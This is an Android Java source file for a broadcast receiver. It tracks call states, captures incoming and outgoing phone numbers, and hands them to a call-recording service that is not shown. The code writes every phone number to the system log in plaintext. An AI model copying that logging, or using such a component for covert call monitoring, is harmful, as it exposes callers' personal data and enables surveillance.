package com.security.ravan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Broadcast receiver for detecting incoming and outgoing calls
 */
public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";

    // Track call state
    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static boolean isIncoming = false;
    private static String savedNumber = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "onReceive: " + action);

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
            handlePhoneStateChange(context, intent);
        } else if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            handleOutgoingCall(context, intent);
        }
    }

    private void handlePhoneStateChange(Context context, Intent intent) {
        String stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        int state = TelephonyManager.CALL_STATE_IDLE;

        if (TelephonyManager.EXTRA_STATE_IDLE.equals(stateStr)) {
            state = TelephonyManager.CALL_STATE_IDLE;
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(stateStr)) {
            state = TelephonyManager.CALL_STATE_OFFHOOK;
        } else if (TelephonyManager.EXTRA_STATE_RINGING.equals(stateStr)) {
            state = TelephonyManager.CALL_STATE_RINGING;
        }

        onCallStateChanged(context, state, number);
    }

    private void handleOutgoingCall(Context context, Intent intent) {
        // Capture outgoing number
        savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        isIncoming = false;
        Log.d(TAG, "Outgoing call to: " + savedNumber);
    }

    private void onCallStateChanged(Context context, int state, String incomingNumber) {
        // Prevent duplicate state notifications
        if (state == lastState) {
            return;
        }

        int previousState = lastState;
        lastState = state;

        Log.d(TAG, "Call state changed: " + previousState + " -> " + state + ", number: " + incomingNumber);

        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                // Incoming call ringing
                isIncoming = true;
                savedNumber = incomingNumber;
                onIncomingCallReceived(context, savedNumber);
                break;

            case TelephonyManager.CALL_STATE_OFFHOOK:
                // Call answered or outgoing
                if (isIncoming) {
                    // Incoming call answered
                    onIncomingCallAnswered(context, savedNumber);
                } else {
                    // Outgoing call started
                    onOutgoingCallStarted(context, savedNumber);
                }
                break;

            case TelephonyManager.CALL_STATE_IDLE:
                // Call ended
                if (previousState == TelephonyManager.CALL_STATE_RINGING) {
                    // Missed call (never answered)
                    onMissedCall(context, savedNumber);
                } else if (previousState == TelephonyManager.CALL_STATE_OFFHOOK) {
                    // Call ended
                    onCallEnded(context, savedNumber, isIncoming);
                }

                // Reset state
                isIncoming = false;
                savedNumber = null;
                break;
        }
    }

    private void onIncomingCallReceived(Context context, String number) {
        Log.d(TAG, "Incoming call received: " + number);
        sendCallStateToService(context, TelephonyManager.CALL_STATE_RINGING, number);
    }

    private void onIncomingCallAnswered(Context context, String number) {
        Log.d(TAG, "Incoming call answered: " + number);
        sendCallStateToService(context, TelephonyManager.CALL_STATE_OFFHOOK, number);
    }

    private void onOutgoingCallStarted(Context context, String number) {
        Log.d(TAG, "Outgoing call started: " + number);
        sendCallStateToService(context, TelephonyManager.CALL_STATE_OFFHOOK, number);
    }

    private void onMissedCall(Context context, String number) {
        Log.d(TAG, "Missed call from: " + number);
        // Still send to service as IDLE
        sendCallStateToService(context, TelephonyManager.CALL_STATE_IDLE, number);
    }

    private void onCallEnded(Context context, String number, boolean incoming) {
        Log.d(TAG, "Call ended: " + number + " (was incoming: " + incoming + ")");
        sendCallStateToService(context, TelephonyManager.CALL_STATE_IDLE, number);
    }

    private void sendCallStateToService(Context context, int callState, String phoneNumber) {
        try {
            Intent serviceIntent = new Intent(context, CallRecordService.class);
            serviceIntent.setAction("CALL_STATE_CHANGED");
            serviceIntent.putExtra("call_state", callState);
            serviceIntent.putExtra("phone_number", phoneNumber);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending call state to service", e);
        }
    }
}
